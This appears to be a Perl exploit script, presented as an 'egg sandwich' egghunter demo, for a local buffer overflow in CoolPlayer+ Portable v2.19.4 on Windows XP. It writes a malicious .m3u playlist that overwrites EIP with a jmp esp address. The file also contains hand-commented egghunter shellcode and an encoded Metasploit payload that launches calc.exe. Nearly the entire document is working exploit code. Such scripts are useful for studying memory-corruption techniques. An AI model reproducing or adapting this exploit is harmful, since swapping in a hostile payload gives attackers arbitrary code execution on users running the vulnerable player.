#!/usr/bin/perl
###########################################################################################
# Exploit Title: CoolPlayer+ Portable v2.19.4 - Local Buffer Overflow Shellcode Jump Demo
# Date: 12-24-2013
# Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: CoolPlayer+ Portable v2.19.4
# Software Link: http://portableapps.com/apps/music_video/coolplayerp_portable
# Tested On: Windows XP SP3
# Based on original POC exploit: http://www.exploit-db.com/exploits/4839/
# Details: Egg Sandwich Egghunter Demo
###########################################################################################

my $buffsize = 10000; # set consistent buffer size

my $junk = "\x90" x 224; # nops to slide into $jmp; offset to eip overwrite at 260
my $eip = pack('V',0x7c86467b); # jmp esp [kernel32.dll]

# loop_inc_page:
my $egghunter =           "\x66\x81\xca\xff\x0f"; # OR DX,0FFF ; get next page&nbsp;

# loop_inc_one:
$egghunter = $egghunter . "\x42";                 # INC EDX ; increment EDX by 1 to get next memory address

# check_memory:
$egghunter = $egghunter . "\x52";                 # PUSH EDX ; save current address to stack
$egghunter = $egghunter . "\x6a\x43";             # PUSH 43 ; push Syscall for NtDisplayString to stack
$egghunter = $egghunter . "\x58";                 # POP EAX ; pop syscall parameter into EAX for syscall
$egghunter = $egghunter . "\xcd\x2e";             # INT 2E ; issue interrupt to make syscall
$egghunter = $egghunter . "\x3c\x05";             # CMP AL,5 ; compare low order byte of eax to 0x5 (indicates access violation)
$egghunter = $egghunter . "\x5a";                 # POP EDX ; restore EDX from the stack
$egghunter = $egghunter . "\x74\xef";             # JE SHORT ;if zf flag = 1, access violation, jump to loop_inc_page

# check_egg
$egghunter = $egghunter . "\xb8\x50\x57\x4e\x44"; # MOV EAX,444E5750 ; valid address, move egg value (PWND) into EAX for comparison
$egghunter = $egghunter . "\x8b\xfa";             # MOV EDI,EDX ; set edi to current address pointer for use in scasd
$egghunter = $egghunter . "\xaf";                 # SCASD ; compare value in EAX to dword value addressed by EDI
                                                  #  ; increment EDI by 4 if DF flag is 0 or decrement if 1
$egghunter = $egghunter . "\x75\xea";             # JNZ SHORT ; egg not found, jump back to loop_inc_one
$egghunter = $egghunter . "\xaf";                 # SCASD ; first half of egg found, compare next half
$egghunter = $egghunter . "\x75\xe7";             # JNZ SHORT  ; only first half found, jump back to loop_inc_one

# found_egg
$egghunter = $egghunter . "\x8b\xf7";             # MOV ESI,EDI ; first egg found, move start address of shellcode to ESI for LODSB    
$egghunter = $egghunter . "\x31\xc0";             # XOR EAX, EAX ; clear EAX contents
$egghunter = $egghunter . "\xac";                 # LODSB  ; loads egg number (1 or 2) into AL
$egghunter = $egghunter . "\x8b\xd7";             # MOV EDX,EDI  ; move start of shellcode into EDX
$egghunter = $egghunter . "\x3c\x01";             # CMP AL,1 ; determine if this is the first egg or last egg
$egghunter = $egghunter . "\xac";                 # LODSB  ; loads size of shellcode from $egg1 into AL
$egghunter = $egghunter . "\x75\x04";             # JNZ SHORT ; cmp false, second egg found, goto second_egg

# first_egg
$egghunter = $egghunter . "\x01\xc2";             # ADD EDX, EAX ; increment EDX by size of shellcode to point to 2nd egg
$egghunter = $egghunter . "\x75\xe3";             # JNZ SHORT  ; jump back to check_egg 

# second_egg 
$egghunter = $egghunter . "\x29\xc7";             # SUB EDI, EAX ; decrement EDX to point to start of shellcode
$egghunter = $egghunter . "\xff\xe7";             # JMP EDI  ; execute shellcode

my $nops = "\x90" x 50; 
my $egg1 = "\x50\x57\x4e\x44\x50\x57\x4e\x44\x01\xe3"; # egg = PWNDPWND; id = 1; offset to egg2 = 227

# Calc.exe payload [size 227]
# msfpayload windows/exec CMD=calc.exe R | 
# msfencode -e x86/shikata_ga_nai -t perl -c 1 -b '\x00\x0a\x0d\xff'
my $shell = "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" .
"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" .
"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e" .
"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1" .
"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27" .
"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb" .
"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b" .
"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2" .
"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37" .
"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3" .
"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef" .
"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb" .
"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf" .
"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83" .
"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3" .
"\x9a\xca\xc0";

my $egg2 = "\x50\x57\x4e\x44\x50\x57\x4e\x44\x02\xeb"; # egg = PWNDPWND; id = 2; offset to egg1 = 235

my $sploit = $junk.$eip.$egghunter.$nops.$egg1.$shell.$egg2; # build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n"; 